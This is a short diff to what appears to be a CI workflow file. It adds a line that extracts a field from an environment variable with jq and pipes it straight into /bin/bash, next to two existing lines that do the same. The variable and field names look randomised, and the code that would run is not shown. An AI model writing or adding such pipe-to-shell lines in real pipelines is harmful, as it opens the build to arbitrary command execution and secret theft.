@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$ylpc8" | jq -r .rgo08 | /bin/bash
           echo $c29 | jq -r .l1 | /bin/bash
+          printf '%s' "$fljc07087" | jq -r .obbr3303 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
